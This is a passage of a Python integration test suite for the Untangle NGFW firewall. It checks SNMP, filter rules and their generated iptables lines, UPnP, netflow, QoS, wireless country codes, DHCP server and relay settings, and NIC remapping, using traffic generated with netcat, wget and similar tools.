        v3Result = try_snmp_command( commands[1] )
        global_functions.uvmContext.systemManager().setSettings(orig_system_settings)
        assert( v2cResult == 1 )
        assert( v3Result == 0 )

    def test_138_snmp_disabled(self):
        verify_snmp_walk()
        orig_system_settings = global_functions.uvmContext.systemManager().getSettings()
        system_settings = global_functions.uvmContext.systemManager().getSettings()
        system_settings['snmpSettings']['enabled'] = False
        global_functions.uvmContext.systemManager().setSettings(system_settings)
        result = remote_control.run_command("snmpwalk -v 2c -c atstest " + global_functions.get_lan_ip() + " | grep untangle")
        global_functions.uvmContext.systemManager().setSettings(orig_system_settings)
        assert(result == 1)

    def test_140_sessions_table(self):
        found_test_session = False
        remote_control.run_command("nohup netcat -d -4 test.untangle.com 80 >/dev/null 2>&1",stdout=False,nowait=True)
        loopLimit = 5
        while ((not found_test_session) and (loopLimit > 0)):
            loopLimit -= 1
            time.sleep(1)
            result = global_functions.uvmContext.sessionMonitor().getMergedSessions()
            sessionList = result['list']
            # find session generated with netcat in session table.
            for i in range(len(sessionList)):
                # print(sessionList[i])
                # print("------------------------------")
                if (sessionList[i]['preNatClient'] == remote_control.client_ip) and \
                   (sessionList[i]['postNatServer'] == test_untangle_com_ip) and \
                   (sessionList[i]['postNatServerPort'] == 80) and \
                   (not sessionList[i]['bypassed']):
                    found_test_session = True
                    break
        remote_control.run_command("pkill netcat")
        assert(found_test_session)

    def test_141_hosts_table(self):
        found_test_session = False
        remote_control.run_command("nohup netcat -d -4 test.untangle.com 80 >/dev/null 2>&1",stdout=False,nowait=True)
        time.sleep(2) # since we launched netcat in background, give it a second to establish connection
        result = global_functions.uvmContext.hostTable().getHosts()
        hostList = result['list']
        # find session generated with netcat in session table.
        for i in range(len(hostList)):
            # print(hostList[i])
            # print("------------------------------")
            if (hostList[i]['address'] == remote_control.client_ip):
                foundHost = True
                break
        remote_control.run_command("pkill netcat")
        assert(foundHost)

    # Test logging of blocked sessions via untangle-nflogd
    @pytest.mark.slow
    def test_150_filter_rules_blocked_event_log(self):
        if runtests.quick_tests_only:
            raise unittest.SkipTest('Skipping a time consuming test')
        # verify port 80 is open
        result1 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com"))

        # Add a block rule for port 80 and enabled blocked session logging
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['filterRules']['list'] = [ create_filter_rules("DST_PORT","80","PROTOCOL","TCP",True) ]
        netsettings['logBlockedSessions'] = True
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        for i in range(0, 10):
            # make the request again which should now be blocked and logged
            result2 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com/"))

            # grab all of the blocked events for checking later
            events = global_functions.get_events('Network','Blocked Sessions',None,100)
            found = global_functions.check_events( events.get('list'), 100,
                                                   "s_server_addr", test_untangle_com_ip,
                                                   "c_client_addr", remote_control.client_ip,
                                                   "local_addr", remote_control.client_ip,
                                                   "remote_addr", test_untangle_com_ip,
                                                   "s_server_port", 80)
            if found:
                break

            # give the NetFilterLogger time to receive and write the event
            # This is necessary because we have no way to "flush" events
            # Sleep 10 before trying again
            time.sleep(10)

        # put the network settings back the way we found them
        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        # make sure all of our tests were successful
        assert (result1 == 0)
        assert (result2 != 0)

        assert(events != None)
        assert(found)

    
    def test_148_invert_iptables_command(self):
        file_path = '/etc/untangle/iptables-rules.d/240-filter-rules'
          # Lines to search for in the file content
        expected_iptables_commands = [
            "${IPTABLES} -t filter -A filter-rules  -m mac ! --mac-source 08:00:27:96:11:ee  -m comment --comment \"Rule #1\"  -m iprange ! --src-range 192.168.56.150-192.168.56.155  -j NFLOG --nflog-prefix 'filter_blocked'",
            "${IPTABLES} -t filter -A filter-rules  -m mac ! --mac-source 08:00:27:96:11:ee  -m comment --comment \"Rule #1\"  -m iprange ! --src-range 192.168.56.150-192.168.56.155  -j REJECT",
            "${IP6TABLES} -t filter -A filter-rules  -m mac ! --mac-source 08:00:27:96:11:ee  -m comment --comment \"Rule #1\"  -m iprange ! --src-range 192.168.56.150-192.168.56.155  -j REJECT"
        ]
        
        # Add a block rule with invert operator for MacAddress and 
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['filterRules']['list'] = [ create_invert_filter_rules("SRC_MAC","08:00:27:96:11:ee","SRC_ADDR","192.168.56.150-192.168.56.155",True) ]
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        # Open the file and check if the command is generated as expected
        with open(file_path, 'r') as file:
            file_contents = file.read()
            # Check if each line is present in the file content
            all_lines_found = all(expected_iptables_commands in file_contents for expected_iptables_commands in expected_iptables_commands)

        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
        # Check if the expected command is equals to actual command
        if all_lines_found:
            self.assertTrue(True)  
        else:
            self.assertTrue(False)

    # Test that filter rule's SRC_ADDR condition supports commas
    def test_151_filter_rules_blocked_src_comma(self):
        # verify port 80 is open
        result1 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com"))

        # Add a block rule for port 80 and enabled blocked session logging
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['filterRules']['list'] = [ create_filter_rules("SRC_ADDR",remote_control.client_ip+",1.2.3.4","PROTOCOL","TCP",True) ]
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        # make the request again which should now be blocked
        result2 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com/"))

        # put the network settings back the way we found them
        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        assert (result1 == 0)
        assert (result2 != 0)

    # Test that filter rule's SRC_ADDR condition supports commas and many many entries
    # This is because iptables only supports so many entries so the rules must be broken apart
    def test_152_filter_rules_blocked_src_comma_many(self):
        # verify port 80 is open
        result1 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com"))

        str = ""
        for i in range(0,20):
            str += "1.2.3.4,"
        str += remote_control.client_ip

        # Add a block rule for port 80 and enabled blocked session logging
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['filterRules']['list'] = [ create_filter_rules("SRC_ADDR",str,"PROTOCOL","TCP",True) ]
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        # make the request again which should now be blocked
        result2 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com/"))

        # put the network settings back the way we found them
        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        assert (result1 == 0)
        assert (result2 != 0)

    # Test that filter rule's SRC_MAC condition supports commas
    def test_153_filter_rules_blocked_src_mac_comma(self):
        remote_control.run_command("nohup netcat -d -4 test.untangle.com 80 >/dev/null 2>&1",stdout=False,nowait=True)
        time.sleep(2) # since we launched netcat in background, give it a second to establish connection
        host_list = global_functions.uvmContext.hostTable().getHosts()['list']
        # find session generated with netcat in session table.
        for i in range(len(host_list)):
            # print(host_list[i])
            # print("------------------------------")
            if (host_list[i]['address'] == remote_control.client_ip):
                found_host = host_list[i]
                break
        remote_control.run_command("pkill netcat")
        assert(found_host != None)
        if found_host.get('macAddress') == None:
            raise unittest.SkipTest('Skipping because we dont know the MAC')
        
        print((found_host.get('macAddress')))
        # verify port 80 is open
        result1 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com"))

        # Add a block rule for port 80 and enabled blocked session logging
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['filterRules']['list'] = [ create_filter_rules("SRC_MAC",found_host.get('macAddress')+",22:22:22:22:22:22","PROTOCOL","TCP",True) ]
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        # make the request again which should now be blocked
        result2 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com/"))

        # put the network settings back the way we found them
        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        assert (result1 == 0)
        assert (result2 != 0)

    # Test that filter rule's CLIENT_TAGGED condition supports commas
    def test_154_filter_rules_blocked_client_tagged(self):
        # verify port 80 is open
        result1 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com"))

        global_functions.host_tags_add("foobar")
        
        # Add a block rule for port 80 and enabled blocked session logging
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['filterRules']['list'] = [ create_filter_rules("CLIENT_TAGGED","foobar","PROTOCOL","TCP",True) ]
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        # make the request again which should now be blocked
        result2 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com/"))

        global_functions.host_tags_clear()
        
        # put the network settings back the way we found them
        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        assert (result1 == 0)
        assert (result2 != 0)
        
    # Test UDP traceroute
    def test_160_traceroute_udp(self):
        traceroute_exists = remote_control.run_command("test -x /usr/sbin/traceroute")
        if traceroute_exists != 0:
            raise unittest.SkipTest("Traceroute app needs to be installed on client")
        result = remote_control.run_command("/usr/sbin/traceroute test.untangle.com", stdout=True)
        # 3 occurances of ms per line so check for at least two lines of ms times.
        assert(result.count('ms') > 4) 

    # UPnP - Disabled
    def test_170_upnp_disabled(self):
        raise unittest.SkipTest("Upnpc no longer supported NGFW-13995")
        upnpc_exists = remote_control.run_command("test -x /usr/bin/upnpc")
        if upnpc_exists != 0:
            raise unittest.SkipTest("Upnpc app needs to be installed on client")
        if global_functions.is_bridged(wan_ip):
            raise unittest.SkipTest("Unable to disable upnp on bridged configurations")
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['upnpSettings']['upnpEnabled'] = False
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
        result = remote_control.run_command("/usr/bin/upnpc -i -a %s 5559 5559 tcp >/dev/null 2>&1" % (remote_control.client_ip),stdout=False)
        assert(result != 0)

    # UPnP - Enabled
    def test_171_upnp_enabled_defaults(self):
        raise unittest.SkipTest("Upnpc no longer supported NGFW-13995")
        upnpc_exists = remote_control.run_command("test -x /usr/bin/upnpc")
        if upnpc_exists != 0:
            raise unittest.SkipTest("Upnpc app needs to be installed on client")
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['upnpSettings']['upnpEnabled'] = True
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
        result = remote_control.run_command("/usr/bin/upnpc -i -a %s 5559 5559 tcp >/dev/null 2>&1" % (remote_control.client_ip),stdout=False)
        assert(result == 0)

    # UPnP - Secure mode enabled
    def test_172_upnp_secure_mode_enabled(self):
        raise unittest.SkipTest("Upnpc no longer supported NGFW-13995")
        upnpc_exists = remote_control.run_command("test -x /usr/bin/upnpc")
        if upnpc_exists != 0:
            raise unittest.SkipTest("Upnpc app needs to be installed on client")
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['upnpSettings']['upnpEnabled'] = True
        netsettings['upnpSettings']['secureMode'] = True
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
        result1 = remote_control.run_command("/usr/bin/upnpc -i -a %s 5559 5559 tcp >/dev/null 2>&1" % (remote_control.client_ip),stdout=False)
        result2 = remote_control.run_command("/usr/bin/upnpc -i -a %s 5558 5558 tcp 2>&1 | grep ConflictInMappingEntry" % ("1.2.3.4"),stdout=False)
        assert(result1 == 0)
        assert(result2 == 0)

    # UPnP - Secure mode disabled
    def test_173_upnp_secure_mode_disabled(self):
        raise unittest.SkipTest("Upnpc no longer supported NGFW-13995")
        upnpc_exists = remote_control.run_command("test -x /usr/bin/upnpc")
        if upnpc_exists != 0:
            raise unittest.SkipTest("Upnpc app needs to be installed on client")
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['upnpSettings']['upnpEnabled'] = True
        netsettings['upnpSettings']['secureMode'] = False
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
        result1 = remote_control.run_command("/usr/bin/upnpc -i -a %s 5559 5559 tcp >/dev/null 2>&1" % (remote_control.client_ip),stdout=False)
        result2 = remote_control.run_command("/usr/bin/upnpc -i -a %s 5558 5558 tcp 2>&1 | grep ConflictInMappingEntry" % ("1.2.3.4"),stdout=False)
        assert(result1 == 0)
        assert(result2 == 1)

    # UPnP - Enabled, Deny rule
    def test_174_upnp_rules_deny_all(self):
        raise unittest.SkipTest("Upnpc no longer supported NGFW-13995")
        upnpc_exists = remote_control.run_command("test -x /usr/bin/upnpc")
        if upnpc_exists != 0:
            raise unittest.SkipTest("Upnpc app needs to be installed on client")
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['upnpSettings']['upnpEnabled'] = True
        netsettings['upnpSettings']['upnpRules'] = {
            "javaClass": "java.util.LinkedList",
            "list": [{
                    "allow": False,
                    "conditions": {
                        "javaClass": "java.util.LinkedList",
                        "list": [
                            {
                                "conditionType": "SRC_ADDR",
                                "invert": False,
                                "javaClass": "com.untangle.uvm.network.UpnpRuleCondition",
                                "value": "0.0.0.0/0"
                            },
                            {
                                "conditionType": "DST_PORT",
                                "invert": False,
                                "javaClass": "com.untangle.uvm.network.UpnpRuleCondition",
                                "value": "0-65535"
                            },
                            {
                                "conditionType": "SRC_PORT",
                                "invert": False,
                                "javaClass": "com.untangle.uvm.network.UpnpRuleCondition",
                                "value": "0-65535"
                            }
                        ]
                    },
                    "description": "Deny all",
                    "enabled": True,
                    "javaClass": "com.untangle.uvm.network.UpnpRule",
                    "ruleId": 2
                }                
            ]
        }
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
        result = remote_control.run_command("/usr/bin/upnpc -i -a %s 5559 5559 tcp 2>&1 | grep failed" % (remote_control.client_ip),stdout=False)
        assert(result == 0)

    def test_180_netflow_enable_disable(self):
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['netflowSettings']['enabled'] = True
        netsettings['netflowSettings']['host'] = global_functions.LIST_SYSLOG_SERVER
        netsettings['netflowSettings']['port'] = 9555
        netsettings['netflowSettings']['version'] = "9"
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
        # check if netflow is running
        result1 = subprocess.call("ps aux | grep softflowd | grep -v grep >/dev/null 2>&1", shell=True)

        # check if netflow stops running if disabled.
        netsettings['netflowSettings']['enabled'] = False
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
        result2 = subprocess.call("ps aux | grep softflowd | grep -v grep >/dev/null 2>&1", shell=True)

        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        assert(result1 == 0)
        assert(result2 == 1)

    def test_190_qos_statistics(self):
        # Check of the QoS Statistics script is returning the proper string.        
        # Enable QoS if not enabled
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['qosSettings']['qosEnabled'] = True
        i = 0
        for interface in netsettings['interfaces']['list']:
            if interface['isWan']:
                netsettings['interfaces']['list'][i]['downloadBandwidthKbps']=10000
                netsettings['interfaces']['list'][i]['uploadBandwidthKbps']=10000
            i += 1
        netsettings['bypassRules']['list'] = []
        netsettings['qosSettings']['qosRules']['list'] = []
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
        
        found = False
        timeout = 60
        qos_data = []
        remote_control.is_online() # generate some traffic.
        while not found and timeout > 0:
            timeout -= 1
            time.sleep(1)
            qos_output_obj = subprocess.run("/usr/share/untangle/bin/qos-status.py", capture_output=True)
            if qos_output_obj.returncode != 0 or qos_output_obj.stdout is None :
                timeout -= 1
                time.sleep(1)
                continue
            qos_query_output = qos_output_obj.stdout
            qos_output_decode = qos_query_output.decode("utf-8")
            # The JSON returned is using single quotes which is not JSON spec RFC7159 
            qos_output_decode = qos_output_decode.replace("\'", "\"")
            qos_data = json.loads(qos_output_decode)
            if qos_data:
                found = True
            else:
                global_functions.get_download_speed()
        assert(qos_data[0]["priority"] != '')

    def test_201_wireless_current_country_code_channels(self):
        """
        Verify we can get channels for the current country code
        """
        wireless_interfaces_found = False
        wireless_system_dev = None
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        for interface in netsettings['interfaces']['list']:
            if interface['isWirelessInterface'] is True:
                wireless_interfaces_found = True
                wireless_system_dev = interface["systemDev"]
                break

        if wireless_interfaces_found is False:
            raise unittest.SkipTest("missing wireless interfaces")

        channels = global_functions.uvmContext.networkManager().getWirelessChannels(wireless_system_dev,"")
        assert(len(channels) > 0)

    def test_202_wireless_test_country_code_channels(self):
        """
        Verify we can get channels for the new target country code
        """
        wireless_interfaces_found = False
        wireless_system_dev = None
        original_wireless_country_code = None
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        for interface in netsettings['interfaces']['list']:
            if interface['isWirelessInterface'] is True:
                wireless_interfaces_found = True
                original_wireless_country_code = interface['wirelessCountryCode']
                interface['wirelessCountryCode'] = ""
                wireless_system_dev = interface["systemDev"]
                break

        if wireless_interfaces_found is False:
            raise unittest.SkipTest("missing wireless interfaces")

        if global_functions.uvmContext.networkManager().isWirelessRegulatoryCompliant(wireless_system_dev) is False:
            raise unittest.SkipTest("cannot change country code on non-compliant driver")

        # Get current channels
        original_channels = global_functions.uvmContext.networkManager().getWirelessChannels(wireless_system_dev,"")
        assert(len(original_channels) > 0)

        current_driver_regulatory_country_code = global_functions.uvmContext.networkManager().getWirelessRegulatoryCountryCode(wireless_system_dev)

        # Want a different regulatory country code to verify the country counts are not the same
        if original_wireless_country_code == "US" or current_driver_regulatory_country_code == "US":
            test_country_code = "JP"
        else:
            test_country_code = "US"
        test_channels = global_functions.uvmContext.networkManager().getWirelessChannels(wireless_system_dev,test_country_code)
        assert(len(test_channels) > 0)

        print(f"expecting: original_channels={len(original_channels)} != test_channels={len(test_channels)}")

        assert(len(test_channels) != len(original_channels))

    def test_203_wireless_valid_regulatory_country_codes(self):
        """
        Verify we have a non-zero list of regulatory country codes
        If our list is zero, we are likely missing a crda file like /usr/lib/crda/regulatory.bin.
        """
        wireless_interfaces_found = False
        wireless_system_dev = None
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        for interface in netsettings['interfaces']['list']:
            if interface['isWirelessInterface'] is True:
                wireless_interfaces_found = True
                wireless_system_dev = interface["systemDev"]
                break

        if wireless_interfaces_found is False:
            raise unittest.SkipTest("missing wireless interfaces")

        countries = global_functions.uvmContext.networkManager().getWirelessValidRegulatoryCountryCodes(wireless_system_dev)
        print(countries)
        assert(len(countries) > 0)

    def test_350_lan_dhcp_server(self):
        """
        Verify DHCP server on LAN interface
        """
        lan_interface = None
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        for interface in netsettings['interfaces']['list']:
            if interface.get("configType") != 'ADDRESSED':
                continue
            if interface.get("isWan"):
                continue
            lan_interface = interface
            break

        if lan_interface is None:
            raise unittest.SkipTest("missing LAN interface")

        lan_address = lan_interface["v4StaticAddress"]
        lan_subnet = lan_interface["v4StaticNetmask"]

        # Default DHCP settings
        lan_interface["dhcpType"] = "SERVER"
        dhcp_range_start = ".".join(lan_address.split(".")[0:3]) + ".98"
        dhcp_range_end = ".".join(lan_address.split(".")[0:3]) + ".99"
        lan_interface["dhcpRangeStart"] = dhcp_range_start
        lan_interface["dhcpRangeEnd"] = dhcp_range_end
        lan_interface["dhcpDnsOverride"] = ""
        lan_interface["dhcpGatewayOverride"] = ""
        lan_interface["dhcpNetmaskOverride"] = ""
        lan_interface["dhcpPrefixOverride"] = None
        lan_interface["dhcpOptions"]["list"] = []

        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        dhcp_results = global_functions.get_dhcp_client_results()
        if dhcp_results["no_privileges"]:
            raise unittest.SkipTest("client does not have privileges")

        print(dhcp_results)
        assert dhcp_results["dhcp"]["ip_offered"] == dhcp_range_start or dhcp_results["dhcp"]["ip_offered"] == dhcp_range_end, "offered IP address in range"
        assert dhcp_results["dhcp"]["subnet_mask"] == lan_subnet, "subnet mask"
        assert dhcp_results["dhcp"]["router"] == lan_address, "gateway address is lan address"
        assert dhcp_results["dhcp"]["domain_name_server"] == lan_address, "dns address is lan address"

    def test_351_lan_dhcp_server_override_and_options(self):
        """
        Verify DHCP server on LAN interface
        """
        lan_interface = None
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        for interface in netsettings['interfaces']['list']:
            if interface.get("configType") != 'ADDRESSED':
                continue
            if interface.get("isWan"):
                continue
            lan_interface = interface
            break

        if lan_interface is None:
            raise unittest.SkipTest("missing LAN interface")

        lan_address = lan_interface["v4StaticAddress"]
        lan_subnet = lan_interface["v4StaticNetmask"]

        # Override and some options
        lan_interface["dhcpType"] = "SERVER"
        dhcp_range_start = ".".join(lan_address.split(".")[0:3]) + ".98"
        dhcp_range_end = ".".join(lan_address.split(".")[0:3]) + ".99"
        lan_dns = ".".join(lan_address.split(".")[0:3]) + ".10"
        lan_gateway = ".".join(lan_address.split(".")[0:3]) + ".11"
        lan_prefix = 25
        lan_subnet = "255.255.255.128"
        time_server = "1.2.3.4"
        lan_interface["dhcpRangeStart"] = dhcp_range_start
        lan_interface["dhcpRangeEnd"] = dhcp_range_end
        lan_interface["dhcpDnsOverride"] = lan_dns
        lan_interface["dhcpGatewayOverride"] = lan_gateway
        lan_interface["dhcpNetmaskOverride"] = lan_subnet
        lan_interface["dhcpPrefixOverride"] = lan_prefix
        lan_interface["dhcpOptions"]["list"] = [{
            "description": "time server",
            "enabled": True,
            "javaClass": "com.untangle.uvm.network.DhcpOption",
            "value": f"4,{time_server}"
        }]

        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        dhcp_results = global_functions.get_dhcp_client_results()
        if dhcp_results["no_privileges"]:
            raise unittest.SkipTest("client does not have privileges")
        print(dhcp_results)

        assert dhcp_results["dhcp"]["ip_offered"] == dhcp_range_start or dhcp_results["dhcp"]["ip_offered"] == dhcp_range_end, "offered IP address in range"
        assert dhcp_results["dhcp"]["subnet_mask"] == lan_subnet, "subnet mask"
        assert dhcp_results["dhcp"]["router"] == lan_gateway, "gateway address overridden"
        assert dhcp_results["dhcp"]["domain_name_server"] == lan_dns, "dns address overridden"
        assert dhcp_results["dhcp"]["time_server"] == time_server, "option for time server"

        # Extended options
        multi_dns_addresses="1.2.3.4, 2.3.4.5, 3.4.5.6"
        vendor_specific_string="ConfigServers=10.0.63.10, country=1, language=1, layer2tagging=1, vlanid=13"
        lan_interface["dhcpOptions"]["list"] = [{
            "description": "multi DNS",
            "enabled": True,
            "javaClass": "com.untangle.uvm.network.DhcpOption",
            "value": f"6,{multi_dns_addresses}"
        },{
            "description": "non-quoted vendor specific information",
            "enabled": True,
            "javaClass": "com.untangle.uvm.network.DhcpOption",
            "value": f"43,{vendor_specific_string}"
        }]
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        dhcp_results = global_functions.get_dhcp_client_results()
        if dhcp_results["no_privileges"]:
            raise unittest.SkipTest("client does not have privileges")
        print(dhcp_results)

        assert dhcp_results["dhcp"]["domain_name_server"] == multi_dns_addresses, "multi dns address overridden"
        assert dhcp_results["dhcp"]["vendor_specific_information"] == vendor_specific_string, "vendor specific string"

        # Extended options - quoted string
        # String should come back as if it were not quoted
        lan_interface["dhcpOptions"]["list"] = [{
            "description": "quoted vendor specific information",
            "enabled": True,
            "javaClass": "com.untangle.uvm.network.DhcpOption",
            "value": f"43,\"{vendor_specific_string}\""
        }]
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        dhcp_results = global_functions.get_dhcp_client_results()
        if dhcp_results["no_privileges"]:
            raise unittest.SkipTest("client does not have privileges")
        print(dhcp_results)

        assert dhcp_results["dhcp"]["vendor_specific_information"] == vendor_specific_string, "vendor specific string"

    def test_352_lan_dhcp_relay(self):
        """
        Verify DHCP dhcp on LAN interface
        """
        lan_interface = None
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        for interface in netsettings['interfaces']['list']:
            if interface.get("configType") != 'ADDRESSED':
                continue
            if interface.get("isWan"):
                continue
            lan_interface = interface
            break

        if lan_interface is None:
            raise unittest.SkipTest("missing LAN interface")

        # Establish ipsec tunnel to remote DHCP server
        try:
            app_ipsec = NetworkTests.get_app("ipsec-vpn")
        except:
            raise unittest.SkipTest("app %s already instantiated" % "ipsec-vpn")
        ipsec_app_settings = app_ipsec.getSettings()
        ipsec_app_settings["tunnels"]["list"].append(test_ipsec_vpn.build_ipsec_tunnel())
        app_ipsec.setSettings(ipsec_app_settings)

        ping_result = 1
        timeout = 10
        while (ping_result and timeout > 0):
            timeout -= 1
            time.sleep(1)
            ping_result = subprocess.call(["ping","-c","1",test_ipsec_vpn.IPSEC_HOST_LAN_IP],stdout=subprocess.PIPE,stderr=subprocess.PIPE)

        if ping_result:
            assert False, "unable to establish ipsec connection"

        # Default DHCP settings
        lan_interface["dhcpType"] = "RELAY"
        lan_interface["dhcpRelayAddress"] = DHCP_RELAY_ADDRESS

        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        dhcp_results = global_functions.get_dhcp_client_results()
        if dhcp_results["no_privileges"]:
            raise unittest.SkipTest("client does not have privileges")

        print(dhcp_results)

        # Not so easy to verify results, but being defined is enough
        assert "ip_offered" in dhcp_results["dhcp"], "offered IP address in range"
        assert "subnet_mask" in dhcp_results["dhcp"], "offered subnet mask"
        assert "router" in dhcp_results["dhcp"], "offered gateway"
        assert "domain_name_server" in dhcp_results["dhcp"], "offered DNS address"
        # Identifier tends to be firist IP address which is typically WAN but could be LAN depending on order, so try both
        assert dhcp_results["dhcp"]["server_identifier"] == DHCP_RELAY_ADDRESS or dhcp_results["dhcp"]["server_identifier"] == test_ipsec_vpn.IPSEC_HOST, "received from relay host"

    def test_353_lan_dhcp_disabled(self):
        """
        Verify DHCP server/relay disabled on LAN interface
        """
        lan_interface = None
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        for interface in netsettings['interfaces']['list']:
            if interface.get("configType") != 'ADDRESSED':
                continue
            if interface.get("isWan"):
                continue
            lan_interface = interface
            break

        if lan_interface is None:
            raise unittest.SkipTest("missing LAN interface")

        lan_interface["dhcpType"] = "DISABLED"

        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        dhcp_results = global_functions.get_dhcp_client_results()
        if dhcp_results["no_privileges"]:
            raise unittest.SkipTest("client does not have privileges")

        print(dhcp_results)
        assert len(dhcp_results["dhcp"].keys()) == 0, "empty dhcp results"

    def test_360_dhcp_global_options_maximum_leases(self):
        """
        Verify changing DHCP max leases
        Do so by validating that the number we specify is written to the apprpriate dnsmasq configuration.
        """
        values = [5000, 100000, 10000000]
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        for value in values:
            netsettings["dhcpMaxLeases"] = value
            global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
            dnsmasq_max_lease_setting = subprocess.check_output("grep dhcp-lease-max= /etc/dnsmasq.conf", shell=True).decode('utf-8').split('=')
            print(f"{value} vs {dnsmasq_max_lease_setting[1]}")
            assert int(dnsmasq_max_lease_setting[1]) == value, "dnsmasq value matched"

    def test_400_nic_remapping(self):
        """
        Remap nics
        """
        # Get list of candidate devices to use for swapping
        device_candidates = []
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        for interface in netsettings['interfaces']['list']:
            if interface.get("isVirtualInterface") or \
                interface.get("isVlanInterface") or \
                interface.get("isWirelessInterface"):
                # Don't consider virtual, vlan, or wireless interfaces
                continue
            device_candidates.append(interface.get("physicalDev"))

        if len(device_candidates) < 4:
            raise unittest.SkipTest("not enough devices to safely swap")

        print(device_candidates[-2:])

        # Build current device/mac mapping
        original_device_mac_mapping = build_device_to_mac_address_map(device_candidates[-2:])
        print(f"original_device_mac_mapping={original_device_mac_mapping}")

        # Set settings forces sync-settngs call
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        remap_nics(device_candidates, original_device_mac_mapping)

    def test_401_nic_remapping_disabled_interface(self):
        """
        Remap nics with one interface disabled
        """
        # Get list of candidate devices to use for swapping
        device_candidates = []
        interface_disable_candidate = None
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        for interface in netsettings['interfaces']['list']:
            if interface.get("isVirtualInterface") or \
                interface.get("isVlanInterface") or \
                interface.get("isWan") or \
                interface.get("isWirelessInterface"):
                # Don't consider virtual, vlan, or wireless interfaces
                continue
            device_candidates.append(interface.get("physicalDev"))
            if interface_disable_candidate is None:
                interface_disable_candidate = interface

        if len(device_candidates) < 4:
            raise unittest.SkipTest("not enough devices to safely swap")

        print(device_candidates[-2:])

        # disable first candidate
        interface_disable_candidate['configType'] = "DISABLED"

        # Build current device/mac mapping
        original_device_mac_mapping = build_device_to_mac_address_map(device_candidates[-2:])
        print(f"original_device_mac_mapping={original_device_mac_mapping}")

        # Set settings forces sync-settngs call
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        remap_nics(device_candidates, original_device_mac_mapping)

    def test_402_nic_remapping_udev(self):
        """
        Remap nics using alternate udev method
        """
        # Get list of candidate devices to use for swapping
        device_candidates = []
        interface_disable_candidate = None
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        for interface in netsettings['interfaces']['list']:
            if interface.get("isVirtualInterface") or \
                interface.get("isVlanInterface") or \
                interface.get("isWirelessInterface"):
                # Don't consider virtual, vlan, or wireless interfaces
                continue
            device_candidates.append(interface.get("physicalDev"))
            if interface_disable_candidate is None:
                interface_disable_candidate = interface

        if len(device_candidates) < 4:
            raise unittest.SkipTest("not enough devices to safely swap")

        print(device_candidates[-2:])

        # Build current device/mac mapping
        original_device_mac_mapping = build_device_to_mac_address_map(device_candidates[-2:])
        print(f"original_device_mac_mapping={original_device_mac_mapping}")

